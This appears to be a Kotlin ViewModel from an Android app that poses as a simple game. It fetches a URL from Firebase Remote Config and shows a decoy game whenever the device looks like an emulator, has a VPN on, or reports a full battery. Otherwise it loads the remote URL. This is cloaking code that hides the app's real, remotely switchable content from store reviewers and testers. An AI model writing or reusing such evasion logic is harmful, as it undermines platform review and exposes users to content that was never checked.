package apex.play.time.presentation

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import apex.play.time.data.unswers
import apex.play.time.domain.Keeper
import apex.play.time.domain.Service
import apex.play.time.presentation.ApplicationStatus.Error
import apex.play.time.presentation.ApplicationStatus.Mock
import apex.play.time.presentation.ApplicationStatus.Succsess
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import javax.inject.Inject
@HiltViewModel
class MainViewModel @Inject constructor(
    private val service: Service,
    private val keeper: Keeper
): ViewModel() {
    private val _state = MutableStateFlow(MainState())
    val state = _state.asStateFlow()

    init {
        getFromLocal()
    }

    private fun getFromLocal(
    ) {
        viewModelScope.launch {
            val checkedInternetConnection = service.checkedInternetConnection()
            val pathUrl = keeper.getSharedUrl()
            if (!pathUrl.isNullOrEmpty()) {
                if (checkedInternetConnection) {
                    _state.value.copy(
                        status = Succsess(url = pathUrl)
                    )
                        .updateStateUI()

                } else {
                    game()
                }
            } else {
                if (checkedInternetConnection) {
                    val remoteConfig = FirebaseRemoteConfig.getInstance()
                    val configSettings = FirebaseRemoteConfigSettings.Builder()
                        .setMinimumFetchIntervalInSeconds(3600)
                        .build()
                    remoteConfig.setConfigSettingsAsync(configSettings)
                    remoteConfig.fetchAndActivate()
                        .addOnCompleteListener { p0 ->
                            if (p0.isSuccessful) {
                                val isCheckedVpn = remoteConfig.getBoolean("to")
                                val resultUrl = remoteConfig.getString("url")
                                keeper.setSharedUrl(url = resultUrl)
                                val vpnActive = service.vpnActive()
                                val batteryLevel = service.batteryLevel()

                                if (isCheckedVpn) {
                                    if (service.checkIsEmu() || resultUrl == "" || vpnActive || batteryLevel == 100) {
                                        game()
                                    } else {
                                        _state.value.copy(
                                            status = Succsess(url = resultUrl)
                                        )
                                            .updateStateUI()

                                    }
                                } else {
                                    viewModelScope.launch {
                                        if (service.checkIsEmu() || resultUrl == "" || batteryLevel == 100) {
                                            game()
                                        } else {
                                            _state.value.copy(
                                                status = Succsess(url = resultUrl)
                                            )
                                                .updateStateUI()

                                        }
                                    }
                                }

                            } else {
                                _state.value.copy(
                                    status = Error(error = p0.result.toString())
                                )
                                    .updateStateUI()
                            }
                        }
                } else {
                    game()
                }
            }
        }
    }

    private fun game() {

        _state.value.copy(
            status = Mock
        )
            .updateStateUI()
    }

    fun setAnswer () {

        viewModelScope.launch {
            _state.value.copy(
                answer = unswers.random()
            )
                .updateStateUI()
        }
    }

    private fun MainState.updateStateUI() {
        _state.update {
            this
        }
    }

}